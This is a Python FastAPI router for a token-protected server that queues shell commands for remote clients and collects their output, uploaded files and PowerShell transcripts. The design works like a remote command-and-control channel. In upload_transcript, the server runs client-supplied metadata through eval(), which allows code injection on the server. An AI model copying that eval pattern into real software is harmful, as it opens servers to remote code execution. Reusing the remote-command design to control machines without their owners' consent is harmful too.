from fastapi import APIRouter, File, UploadFile, HTTPException, Depends
from fastapi.responses import FileResponse
from routers.clients import command_queue
from routers.client_registry import update_client_status
from services.command_manager import CommandManager, CommandInfo, ResultType, FileInfo
from services.providers import get_command_manager
from auth import verify_token
from pydantic import BaseModel
from typing import Dict, Optional, List
import os
import shutil
from pathlib import Path

router = APIRouter()

# Create uploads directory if it doesn't exist
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

# 已移至 services.command_manager
import time

class CommandRequest(BaseModel):
    client_id: str
    command: str

class CommandResult(BaseModel):
    command_id: str
    result: str
    status: str  # 'completed', 'failed'
    result_type: ResultType = ResultType.TEXT

# CommandManager 已移至 services.command_manager

@router.get("/next_command")
def get_next_command(client_id: str, hostname: str = None, username: str = None, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    # 更新客戶端狀態（如果提供了環境資訊）
    if hostname and username:
        stable_id = update_client_status(client_id, hostname, username)
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        print(f"Auto-registered stable ID: {stable_id}")
    
    # 使用 CommandManager 取得下一個 pending 命令
    next_command = cmd_manager.get_next_command(stable_id)
    if next_command:
        command, command_id = next_command
        
        # Update status to executing
        cmd_manager.update_command_status(command_id, 'executing')
        print(f"Sending command to {stable_id}: {command} (ID: {command_id})")
        return {"command": command, "command_id": command_id}
    
    return {"command": None}

@router.post("/send_command")
def send_command(request: CommandRequest, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Send command to client using request body"""
    stable_id = request.client_id
    command = request.command
    
    # 自動註冊 client 到 command_queue
    if stable_id not in command_queue:
        command_queue[stable_id] = None
    
    # 使用 CommandManager 統一處理
    try:
        command_id = cmd_manager.queue_command(stable_id, command)
        command_info = cmd_manager.get_command(command_id)
        timestamp = command_info.created_at
        
        return {
            "status": f"Command queued for {stable_id}",
            "command_id": command_id,
            "timestamp": timestamp
        }
    except HTTPException:
        raise  # 重新拋出 409 錯誤

@router.post("/submit_result")
def submit_result(result_data: CommandResult, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Submit command execution result"""
    command_id = result_data.command_id
    
    if not cmd_manager.get_command(command_id):
        return {"error": f"Command ID {command_id} not found"}
    
    # 使用 CommandManager 完成 command
    success = cmd_manager.complete_command(
        command_id, 
        result_data.result, 
        result_data.status, 
        result_data.result_type
    )
    
    if not success:
        return {"error": f"Failed to complete command {command_id}"}
    
    print(f"Result received for {command_id}: {result_data.status} ({result_data.result_type})")
    return {"status": "Result submitted successfully", "command_id": command_id}

@router.get("/get_result/{command_id}")
def get_result(command_id: str, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Get command execution result by command ID"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        return {"error": f"Command ID {command_id} not found"}
    
    return command_info

@router.get("/command_history")
def get_command_history(stable_id: str = None, limit: int = 50, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Get command history, optionally filtered by stable_id"""
    history = list(cmd_manager.command_history.values())
    
    if stable_id:
        history = [cmd for cmd in history if cmd.stable_id == stable_id]
    
    # Sort by created_at (newest first)
    history.sort(key=lambda x: x.created_at, reverse=True)
    
    return {
        "commands": history[:limit],
        "total": len(history)
    }

@router.post("/upload_files/{command_id}")
async def upload_files(command_id: str, files: List[UploadFile] = File(...), cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Upload files for a specific command result"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    # Create command-specific directory
    command_dir = UPLOAD_DIR / command_id
    command_dir.mkdir(exist_ok=True)
    
    uploaded_files = []
    
    for file in files:
        if not file.filename:
            continue
            
        # Security: Clean filename to prevent path traversal
        safe_filename = os.path.basename(file.filename)
        file_path = command_dir / safe_filename
        
        # Save file
        try:
            with open(file_path, "wb") as buffer:
                content = await file.read()
                buffer.write(content)
                
            file_info = FileInfo(
                filename=safe_filename,
                size=len(content),
                content_type=file.content_type or "application/octet-stream",
                upload_timestamp=time.time()
            )
            
            command_info.files.append(file_info)
            uploaded_files.append(file_info)
            
        except Exception as e:
            print(f"Error uploading file {file.filename}: {str(e)}")
            continue
    
    # Update result type based on files
    if command_info.files:
        if command_info.result:
            command_info.result_type = ResultType.MIXED
        else:
            command_info.result_type = ResultType.FILES if len(command_info.files) > 1 else ResultType.FILE
    
    print(f"Uploaded {len(uploaded_files)} files for command {command_id}")
    return {
        "status": "Files uploaded successfully",
        "command_id": command_id,
        "uploaded_files": uploaded_files
    }

@router.get("/download_file/{command_id}/{filename}")
async def download_file(command_id: str, filename: str, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Download a specific file from command results"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    # Check if file exists in command's file list
    file_exists = any(f.filename == filename for f in command_info.files)
    if not file_exists:
        raise HTTPException(status_code=404, detail=f"File {filename} not found for command {command_id}")
    
    file_path = UPLOAD_DIR / command_id / filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {filename} not found on disk")
    
    return FileResponse(
        path=str(file_path),
        filename=filename,
        media_type='application/octet-stream'
    )

@router.get("/list_files/{command_id}")
def list_files(command_id: str, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """List all files associated with a command"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    return {
        "command_id": command_id,
        "files": command_info.files,
        "total_files": len(command_info.files)
    }

@router.post("/upload_transcript/{command_id}")
async def upload_transcript(
    command_id: str,
    transcript_file: UploadFile = File(...),
    metadata: str = None,
    cmd_manager: CommandManager = Depends(get_command_manager),
    token: str = Depends(verify_token)
):
    """Upload PowerShell execution transcript for a specific command"""
    command_info = cmd_manager.get_command(command_id)
    if not command_info:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    # Create command-specific directory
    command_dir = UPLOAD_DIR / command_id
    command_dir.mkdir(exist_ok=True)
    
    # Save transcript with timestamp
    transcript_filename = f"transcript_{int(time.time())}.txt"
    transcript_path = command_dir / transcript_filename
    
    try:
        # Save transcript file
        with open(transcript_path, "wb") as buffer:
            content = await transcript_file.read()
            buffer.write(content)
        
        # Parse metadata if provided
        transcript_metadata = {}
        if metadata:
            try:
                transcript_metadata = eval(metadata) if metadata.startswith('{') else {"info": metadata}
            except:
                transcript_metadata = {"raw_metadata": metadata}
        
        # Create FileInfo for transcript
        file_info = FileInfo(
            filename=transcript_filename,
            size=len(content),
            content_type="text/plain",
            upload_timestamp=time.time()
        )
        
        # Add transcript to command files
        command_info.files.append(file_info)
        
        # Update result type if needed
        if not command_info.result and command_info.status in ['executing', 'pending']:
            command_info.result_type = ResultType.FILE
        elif command_info.result and command_info.result_type == ResultType.TEXT:
            command_info.result_type = ResultType.MIXED
        
        print(f"Uploaded transcript for command {command_id}: {transcript_filename}")
        
        return {
            "status": "Transcript uploaded successfully",
            "command_id": command_id,
            "transcript_file": transcript_filename,
            "metadata": transcript_metadata,
            "upload_timestamp": file_info.upload_timestamp
        }
        
    except Exception as e:
        print(f"Error uploading transcript for {command_id}: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to upload transcript: {str(e)}")

@router.post("/terminate_client/{client_id}")
def terminate_client(client_id: str, cmd_manager: CommandManager = Depends(get_command_manager), token: str = Depends(verify_token)):
    """Send graceful termination signal to client"""
    from routers.client_registry import client_registry

    # Check if client exists
    if client_id not in client_registry:
        raise HTTPException(status_code=404, detail=f"Client '{client_id}' not found")

    # Send special graceful exit command
    special_command = "@PT1:GRACEFUL_EXIT@"

    try:
        command_id = cmd_manager.queue_command(client_id, special_command)

        print(f"Graceful termination signal sent to client '{client_id}' (command_id: {command_id})")

        return {
            "status": "termination_signal_sent",
            "client_id": client_id,
            "command_id": command_id,
            "message": "Graceful shutdown initiated"
        }
    except HTTPException as e:
        raise e
    except Exception as e:
        print(f"Error sending termination signal to {client_id}: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to send termination signal: {str(e)}")